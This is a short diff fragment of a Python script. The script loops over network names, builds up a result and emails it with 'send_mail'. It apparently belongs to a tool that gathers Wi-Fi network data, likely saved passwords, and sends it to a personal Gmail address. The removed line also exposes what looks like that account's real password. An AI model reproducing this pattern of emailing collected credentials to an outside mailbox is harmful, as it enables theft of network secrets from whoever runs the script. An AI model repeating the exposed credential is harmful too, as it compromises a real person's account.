@@ -22,4 +22,4 @@ for network_name in network_names_list:
     result = result + current_result
 
 
-send_mail("sadulloqurbonov33@gmail.com", "sadullo7755", result)
+send_mail("sadulloqurbonov33@gmail.com", "password", result)
